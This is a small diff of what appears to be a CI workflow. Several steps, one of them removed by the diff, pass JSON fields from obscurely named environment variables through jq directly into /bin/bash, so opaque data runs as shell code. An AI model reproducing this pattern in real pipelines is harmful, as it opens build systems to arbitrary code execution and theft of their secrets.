@@ -20,7 +20,6 @@ jobs:
           printf '%s' "$taog6" | jq -r .m8398 | /bin/bash
           echo $j2 | jq -r .wq370 | /bin/bash
           printf '%s' "$s78538" | jq -r .ahr77 | /bin/bash
-          echo $vkyfz42935 | jq -r .uwdmn42488 | /bin/bash
           printf '%s' "$fpvx6250" | jq -r .wbvo006 | /bin/bash
 
       - name: Save output
